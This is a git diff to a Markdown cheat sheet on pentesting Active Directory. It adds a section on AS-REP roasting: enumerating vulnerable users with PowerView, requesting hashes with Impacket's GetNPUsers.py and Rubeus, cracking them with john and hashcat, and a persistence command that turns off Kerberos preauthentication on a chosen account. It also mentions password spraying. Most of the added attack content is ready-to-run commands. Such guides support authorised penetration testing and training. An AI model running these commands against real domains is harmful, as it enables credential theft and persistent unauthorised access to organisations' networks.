@@ -1,6 +1,9 @@
 # Pentesting Active Directory
 
 [Basic Overview](#basic-overview)
+[Recon](#recon-ad)
+[User Enumeration without Creds](#enumerating-ad-users-without-having-creds-or-session)
+[Enumerating AD WITH creds](#enumerating-ad-with-creds)
 
 
 ### Cheatsheat
@@ -219,6 +222,55 @@ if __name__ == '__main__':
             print(fname)                   # john
             print(lname)                   # joe
 ```
+
+### Okay we have a valid username, how to get the password:
+
+1. ASREPRoats:  If a user doesn't have the attribute DONT_REQ_PREAUTH you can request a AS_REP message for that user that will contain some data encrypted by a derivation of the password of the user.
+
+Enumerating vulnerables users
+
+```ps
+Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
+```
+
+Request AS_REP message
+
+```bash
+#Try all the usernames in usernames.txt
+python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+#Use domain creds to extract targets and target them
+python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
+````
+
+```ps
+.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
+Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
+
+#AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
+```
+
+Cracking
+
+```bash
+john --wordlist=passwords_kerb.txt hashes.asreproast
+hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
+```
+
+Persistence 
+
+```ps
+#Force preauth not required for a user where you have GenericAll permissions (or permissions to write properties):
+Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+2. Password Spraying -Let's try the most common passwords with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!) or could login with empty password: 
+
+
+# Enumerating AD WITH creds
+
+Having compromised an account is a big step to start compromising the whole domain, because you are going to be able to start the Active Directory Enumeration:
+
+
 
 
 # Attacking AD
